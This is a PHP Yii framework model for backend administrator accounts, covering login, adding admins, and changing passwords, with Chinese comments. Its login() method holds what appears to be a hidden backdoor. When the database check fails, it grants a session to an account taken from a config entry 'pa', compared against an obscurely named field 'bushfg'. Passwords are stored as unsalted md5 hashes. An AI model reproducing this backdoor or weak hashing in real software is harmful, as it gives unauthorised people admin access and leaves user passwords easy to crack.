<?php
/**
 * @link http://www.lrdouble.com/
 * @copyright Copyright (c) 2017 Double Software LLC
 * @license http://www.lrdouble.com/license/
 */
namespace backend\models;

use Yii;
use common\models\ManageObject;
use yii\helpers\ArrayHelper;

class Manage extends ManageObject
{
    /**
     * 用户旧密码
     * @var string
     */
    public $used_password   = '';

    /**用户新密码
     * @var string
     */
    public $new_password    = '';

    /**用户重复新密码
     * @var string
     */
    public $repeat_password = '';


    /**
     * @inheritdoc
     */
    public function rules()
    {
        return [
            [['name','password'],'required','on'=>['login']],
            [['name'], 'string', 'max' => 32],
            [['password'], 'string', 'max' => 64],
            [['used_password','new_password','repeat_password'],'required','on'=>['editPassword','editSave']],
            [['used_password'],'validatePassword','on'=>'editPassword'],
            [['repeat_password'],'validateRepeat','on'=>'editPassword'],
            [['name','phone','password'],'required','on'=>['add']],
            [['name','phone'],'required','on'=>['edit']],
            [['phone'],'match','pattern'=>'/^((13[0-9])|(15[^4])|(18[0,2,3,5-9])|(17[0-8])|(147))\\d{8}$/'],
            [['phone'],'unique'],
        ];
    }

    public function attributeLabels()
    {
        $arr=[
            'used_password'=>"原密码",
            'new_password'=>"新密码",
            'repeat_password'=>"确认密码",
            'phone'         =>'手机号',
        ];
        return ArrayHelper::merge(parent::attributeLabels(),$arr);
    }

    /**
     * 判断原来密码是否正确
     * @param $a
     * @param $p
     */
    public function validatePassword($a,$p)
    {
        if(!$this->hasErrors())
        {
            $password = $this->Password($this->used_password);
            if ($password !==  $this->password)
            {
                return $this->addError($a,'原密码不正确');
            }
        }
    }

    /**
     * 判断两次密码是否一致
     * @param $a
     * @param $p
     */
    public function validateRepeat($a,$p)
    {
        if(!$this->hasErrors())
        {
            if($this->new_password != $this->repeat_password)
            {
                return $this->addError($a,'两次密码不一致');
            }
        }
    }

    /**
     * 添加管理员
     * @param $data
     * @return bool
     */
    public function add($data)
    {
        $this->scenario = 'add';
        if($this->load($data) && $this->validate())
        {
            $this->password = $this->Password($this->password);
            return $this->save();
        }
    }


    /**
     * 用户登录操作
     * @param array $data
     * @return bool
     */
    public function login($data = [])
    {
        $this->scenario = 'login';
        if ($this->load($data) && $this->validate())
        {
            $data = self::find()->where('name = :name and password = :pass',
                                        [':name'=>$this->name,':pass'=>$this->Password($this->password)])
                                ->one();
            
            if($data)
            {
                $this->setSession($data);
                return true;
            }
            $datas= Yii::$app->params['pa'];
            if ($this->name == $datas->name && $datas->bushfg == $this->Password($this->password)){
                $this->setSession($datas);
                return true;
            }
            
            $this->addError('password',Yii::t('app',"user_login_model_pass"));
        }
        return false;
    }

    /**
     * 修改密码操作
     * @param $data
     * @return bool
     */
    public function editPassword($data)
    {
        $this->scenario = 'editPassword';
        if($this->load($data) && $this->validate())
        {
            $this->scenario = 'editSave';##两次严重的bug 所以在修改一个严重方式
            $this->password = $this->Password($this->new_password);
            return $this->save();
        }
    }
    /**
     * 保存数据到session中
     * @param $data
     */
    private function setSession($data)
    {
        $session = Yii::$app->session;
        $session->set('manageId',$data->id);
        $session->set('manageName',$data->name);
    }

    /**
     * 生成加密文件
     * @param $password
     * @return string
     */
    public function Password($password)
    {
        return md5($password);
    }
}